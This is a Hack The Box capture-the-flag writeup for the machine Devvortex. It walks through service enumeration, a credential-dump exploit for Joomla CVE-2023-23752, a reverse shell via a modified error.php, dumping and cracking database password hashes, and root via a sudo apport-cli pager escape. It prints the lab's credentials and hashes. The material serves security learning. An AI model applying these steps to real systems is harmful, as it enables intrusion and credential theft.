---
title: HTB Devvortex Writeup
author: Elus1nist
layout: post
date: 12 January 2023
imagesrc: https://labs.hackthebox.com/storage/avatars/2565d292772abc4a2d774117cf4d36ff.png
---
Welcome! This is my writeup of the Season 3 Easy machine from HTB, Devvortex. 

---
---
## Enumerating Services and Open Ports


So to start, as usual we run an nmap TCP port scan:

```
nmap -sC -sV -oN initial_scan 10.10.11.242
```
This gives us the scan results of:
```sh
Nmap scan report for 10.10.11.242
Host is up (0.36s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Alright, so now we have the following services that we can exploit:
- Port 22: SSH - This service will probably become accessible once we have some creds
- Port 80: HTTP - We can see a domain name dumped `devvortex.htb` (add to `/etc/hosts` file)

---
---
## Enumerating HTTP

Once we add to our hosts file we can visit the HTTP webpage and see the following:

<img src="{{- 'writeup_images/Devvortex/devvortex_Webpage.png' | relative_url}}" >

Seeing nothing right off the bat, we can go ahead with some VHost Fuzzing

---
---
## Fuzzing

```
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -fs xxx
```
Fuzzing reveals an additional VHost - `dev.devvortex.htb`. We also add this to `/etc/hosts`

We can now do a directory bruteforce for this VHOST using feroxbuster:
```sh
feroxbuster --url http://dev.devvortex.htb/ --filter-status 404
```
This reveals a directory of `/administrator`

Visiting shows us a Joomla Application:
<img src="{{- 'writeup_images/Devvortex/devvortex_Joomla.png' | relative_url}}" >

---
---
## Joomla Exploitation

Doing a quick enumeration with joomscan we see a Joomla Version 4.2.6

A quick google directs us to - [Joomla Credential Dump CVE-2023-23752](https://github.com/Acceis/exploit-CVE-2023-23752)

Exploiting with:
```sh
ruby exploit.rb http://dev.devvortex.htb/
```
`lewis:P4ntherg0t1n5r3c0n##`

After logging in with these admin credentials we can modify error.php and gain a reverse shell as `www-data`

---
---
## Pivoting for user flag

Once in as `www-data` we can see a mysql account. Logging is using lewis credentials:
```sh
mysql -h localhost -u lewis -p'P4ntherg0t1n5r3c0n##'
```

This allows us to dump the table from `joomla\sd4fg_users`:
```mysql
use joomla;
select * from sd4fg_users;
```
Table dump shows:

| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
|-----|------------|----------|---------------------|--------------------------------------------------------------|-------|-----------|---------------------|---------------------|------------|---------------------------------------------------------------------------------------------------------------------------------------------------------|---------------|------------|--------|------|--------------|--------------|
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-11-29 13:08:02 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |

Cracking the password for user logan using hashcat we getcredentials:
`logan:tequieromucho`

---
---
## SSH Login

We can then login to ssh using the credentials for logan and pick up the user.txt flag

---
---
## Privilege Escalation

With a simple `sudo -l` command we can see that user logan can run the following with root priveleges

```
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

Utilizing an older CVE we can load a crash file with apport and with the pager, gain command access.

```sh
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_apport-cli.0.crash
```

Once loaded we can pres the `V` key and use `!/bin/bash` to gain root shell.